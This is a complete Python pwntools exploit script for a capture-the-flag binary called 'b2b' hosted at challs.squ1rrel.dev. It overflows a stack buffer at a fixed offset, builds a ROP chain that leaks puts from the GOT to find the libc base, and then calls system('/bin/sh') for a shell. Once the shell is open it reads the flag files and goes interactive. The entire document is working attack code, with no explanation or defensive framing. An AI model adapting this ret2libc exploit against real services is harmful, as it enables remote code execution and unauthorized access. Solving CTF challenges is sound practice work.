#!/usr/bin/env python3
from pwn import *

exe = ELF('./b2b', checksec=False)
context.binary = exe
context.log_level = 'info'

HOST = 'challs.squ1rrel.dev'
PORT = 5000

POP_RDI = 0x40117e
RET = 0x40101a
OFFSET = 0x48


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(exe.path)


def send_payload(io, chain: bytes):
    io.recvuntil(b'name your favorite classic:\n')
    io.send(flat(
        b'A' * OFFSET,
        chain,
    ))


def leak_puts(io):
    rop = flat(
        POP_RDI,
        exe.got['puts'],
        exe.plt['puts'],
        exe.sym['back2basics'],
    )
    send_payload(io, rop)

    io.recvuntil(b'class dismissed.\n')
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    log.success(f'puts leak: {hex(leak)}')
    return leak


def exploit(io, libc_path='/lib/x86_64-linux-gnu/libc.so.6'):
    libc = ELF(libc_path, checksec=False)

    puts_leak = leak_puts(io)
    libc.address = puts_leak - libc.sym['puts']
    log.success(f'libc base: {hex(libc.address)}')

    system = libc.sym['system']
    binsh = next(libc.search(b'/bin/sh\x00'))

    rop2 = flat(
        RET,
        POP_RDI,
        binsh,
        system,
    )
    send_payload(io, rop2)

    io.recvuntil(b'class dismissed.\n')
    io.sendline(b'cat flag* 2>/dev/null || cat /flag 2>/dev/null || ls')
    out = io.recv(timeout=1) or b''
    print(out.decode('latin-1', errors='ignore'))
    io.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)
